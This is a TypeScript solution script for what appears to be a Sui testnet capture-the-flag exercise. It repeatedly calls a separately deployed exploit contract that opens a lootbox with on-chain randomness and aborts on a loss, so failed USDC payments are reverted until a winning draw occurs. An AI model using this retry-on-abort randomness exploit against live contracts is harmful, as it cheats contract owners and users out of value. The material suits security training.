import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import keyPairJson from "../keypair.json" with { type: "json" };
import { Transaction } from '@mysten/sui/transactions';
import { sleep } from './helpers.ts';

/**
 *
 * Global variables
 *
 * These variables can be used throughout the exercise below.
 *
 */
const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

(async () => {

  // idea is simple, we as the funciton is not entry funciton in the lootboxes.move, we can just call the function from another smart contract.
  // the execution needs to return a flag, if the flag is not returned, we just try again. 
  // if we don't get the flag, this means we had a bad randomness, but thanks to our smart contract
  // we don't lose any money and we can just try again.

  // 15 USDC with 6 decimals
  const REQUIRED_PAYMENT = '15000000';

  // on-chain randomness
  const RANDOM_OBJECT_ID = '0x8';

  // usdc coin object id get through the circle faucet 
  const usdcCoinObjectId =
    '0x29e5cad3cb547669ba4f22e26c18547d13854ae2ccdcc1d42cceabdf7e3db122';

  const EXPLOIT_PACKAGE_ID = '0x36aafd46d0fd8be78a031f7c7579ae84d8a08780e3e358353343cd5aa92a64a0';



  const owner = keypair.getPublicKey().toSuiAddress();
  console.log('owner', owner);

  let attempt = 0;
  for (;;) {
    attempt++;

    const tx = new Transaction();
    
    tx.setGasBudget('50000000');

    // Split exact 15 USDC from your coin (decimals = 6):
    const [paymentCoin] = tx.splitCoins(tx.object(usdcCoinObjectId), [REQUIRED_PAYMENT]);

    // Call your exploit entry function. It will abort on loss (ENoFlag),
    // which reverts the USDC transfer, so you can safely retry.
    tx.moveCall({
      target: `${EXPLOIT_PACKAGE_ID}::toolbox_crack::open_extract_lootbox`,
      arguments: [paymentCoin, tx.object(RANDOM_OBJECT_ID)],
    });

    let result;
    try {
      result = await suiClient.signAndExecuteTransaction({
        transaction: tx,
        signer: keypair,
        include: { effects: true },
      });
    } catch (e) {
      console.log('attempt', attempt, 'threw during build/submit (retrying):', e);
      await sleep(750);
      continue;
    }

    if (result.$kind === 'Transaction' && result.Transaction.status.success) {
      console.log('SUCCESS');
      console.log('attempt', attempt);
      console.log('digest', result.Transaction.digest);
      console.log('status', result.Transaction.status);
      break;
    }

    
    // We log the error and retry.
    const failed = result.$kind === 'FailedTransaction' ? result.FailedTransaction : result.Transaction;
    console.log('attempt', attempt, 'failed status', failed.status);

    await sleep(750);
  }
})();